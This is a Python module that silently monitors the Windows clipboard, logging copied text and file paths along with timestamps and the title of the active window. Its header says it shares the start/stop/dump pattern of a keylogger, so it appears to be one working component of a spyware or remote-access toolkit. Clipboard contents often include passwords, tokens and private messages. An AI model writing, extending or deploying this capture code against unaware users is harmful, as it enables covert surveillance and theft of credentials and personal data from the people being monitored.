# clipboard.py — Clipboard monitoring with window context
#
# Polls the Windows clipboard for changes in a background thread.
# Records text and file-path clipboard entries with timestamps
# and source window titles. Same start/stop/dump pattern as keylogger.

import ctypes
import ctypes.wintypes
import threading
import time
import hashlib
from collections import deque

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# ── Clipboard formats ─────────────────────────────────────────
CF_UNICODETEXT = 13
CF_HDROP = 15


class ClipboardMonitor:
    """Monitors clipboard changes and records entries with context."""

    def __init__(self, max_buffer: int = 5000, poll_interval: float = 0.5):
        self._buffer = deque(maxlen=max_buffer)
        self._running = False
        self._thread = None
        self._lock = threading.Lock()
        self._last_hash = ""
        self._poll_interval = poll_interval

    def _get_window_title(self) -> str:
        """Return the title of the currently focused window."""
        try:
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            if length == 0:
                return "Desktop"
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Desktop"
        except Exception:
            return "Unknown"

    def _get_clipboard_text(self) -> str | None:
        """Read text content from the clipboard."""
        try:
            if not user32.OpenClipboard(0):
                return None
            try:
                if not user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                    return None
                handle = user32.GetClipboardData(CF_UNICODETEXT)
                if not handle:
                    return None
                # Lock the global memory and read the string
                kernel32.GlobalLock.restype = ctypes.c_wchar_p
                text = kernel32.GlobalLock(handle)
                if text:
                    result = str(text)
                    kernel32.GlobalUnlock(handle)
                    return result
                return None
            finally:
                user32.CloseClipboard()
        except Exception:
            try:
                user32.CloseClipboard()
            except Exception:
                pass
            return None

    def _get_clipboard_files(self) -> list | None:
        """Read file paths from the clipboard (CF_HDROP)."""
        try:
            if not user32.OpenClipboard(0):
                return None
            try:
                if not user32.IsClipboardFormatAvailable(CF_HDROP):
                    return None
                handle = user32.GetClipboardData(CF_HDROP)
                if not handle:
                    return None

                # DragQueryFileW to get file count and paths
                shell32 = ctypes.windll.shell32
                count = shell32.DragQueryFileW(handle, 0xFFFFFFFF, None, 0)
                files = []
                for i in range(count):
                    buf_size = shell32.DragQueryFileW(handle, i, None, 0) + 1
                    buf = ctypes.create_unicode_buffer(buf_size)
                    shell32.DragQueryFileW(handle, i, buf, buf_size)
                    files.append(buf.value)
                return files if files else None
            finally:
                user32.CloseClipboard()
        except Exception:
            try:
                user32.CloseClipboard()
            except Exception:
                pass
            return None

    def _poll_loop(self):
        """Poll clipboard for changes and record new entries."""
        while self._running:
            try:
                # Try text first
                text = self._get_clipboard_text()
                if text:
                    content_hash = hashlib.md5(text.encode("utf-8", errors="replace")).hexdigest()
                    if content_hash != self._last_hash:
                        self._last_hash = content_hash
                        window = self._get_window_title()
                        with self._lock:
                            self._buffer.append({
                                "time": time.strftime("%H:%M:%S"),
                                "window": window,
                                "type": "text",
                                "content": text[:4096],  # Cap at 4KB per entry
                            })

                # Try files
                files = self._get_clipboard_files()
                if files:
                    files_str = "|".join(files)
                    content_hash = hashlib.md5(files_str.encode("utf-8")).hexdigest()
                    if content_hash != self._last_hash:
                        self._last_hash = content_hash
                        window = self._get_window_title()
                        with self._lock:
                            self._buffer.append({
                                "time": time.strftime("%H:%M:%S"),
                                "window": window,
                                "type": "files",
                                "content": files,
                            })

            except Exception:
                pass

            time.sleep(self._poll_interval)

    def start(self) -> str:
        """Start the clipboard monitor in a background thread."""
        if self._running:
            return "Clipboard monitor already running"
        self._running = True
        self._thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._thread.start()
        return "Clipboard monitor started"

    def stop(self) -> str:
        """Stop the clipboard monitor."""
        if not self._running:
            return "Clipboard monitor not running"
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        return "Clipboard monitor stopped"

    def dump(self) -> list:
        """Retrieve and clear all buffered clipboard entries."""
        with self._lock:
            entries = list(self._buffer)
            self._buffer.clear()
        return entries
